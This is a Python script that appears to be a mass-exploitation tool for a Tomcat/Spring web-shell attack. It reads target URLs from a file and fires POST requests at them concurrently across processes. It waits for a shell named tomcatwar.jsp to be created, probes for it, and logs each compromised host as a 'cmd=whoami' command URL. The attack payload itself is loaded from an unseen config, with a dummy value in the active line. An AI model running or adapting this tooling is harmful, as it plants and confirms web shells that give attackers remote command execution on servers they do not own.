import asyncio
import aiohttp
import aiofiles
import concurrent.futures
from math import ceil
from config import *
from urllib.parse import urlsplit


async def check(links):
    async with aiohttp.ClientSession() as client:
        for link in links:
            try:
                # async with client.post(url=link, data=post_data, headers=post_headers, ssl=False, allow_redirects=False) as response:
                async with client.post(url=link, data={"c2NyaXB0LWtpZGRpZQ==": "bXVzdC1kaWU="}, ssl=False, allow_redirects=False) as response:
                    await response.text()

                await asyncio.sleep(10)  # timeout, wait for creation shell..

                _ = urlsplit(link)
                root_url = _.scheme + "://" + _.netloc + "/tomcatwar.jsp"

                async with client.get(url=root_url, ssl=False, allow_redirects=False) as response:
                    if response.status == 200:
                        async with aiofiles.open(SUCCESS_LOG, "a+", encoding="utf-8") as success_log:
                            await success_log.write(f"{root_url}?pwd=j&cmd=whoami\n")
                    else:
                        continue

            except Exception as e:
                async with aiofiles.open(ERROR_LOG, "a+", encoding="utf-8") as errors_log:
                    await errors_log.write(f"{link} {e}\n")
                continue


async def start_check(links):
    parted_domains = split_array(links, NUM_COROS)
    tasks = []

    for part in parted_domains:
        tasks.append(check(part))

    await asyncio.gather(*tasks)


def prepare_check(links):
    asyncio.run(start_check(links))


def split_array(array, parts):
    part_len = ceil(len(array) / parts)
    return [array[part_len * k:part_len * (k + 1)] for k in range(parts)]


def main():
    with open("links.txt") as f:
        links = []
        for i in f.readlines():
            links.append(i.strip())

    parted_links = split_array(links, NUM_CPU_CORES)
    futures = []

    with concurrent.futures.ProcessPoolExecutor(NUM_CPU_CORES) as executor:
        for i in range(NUM_CPU_CORES):
            new_future = executor.submit(prepare_check, links=parted_links.pop())
            futures.append(new_future)

    concurrent.futures.wait(futures)


if __name__ == "__main__":
    main()
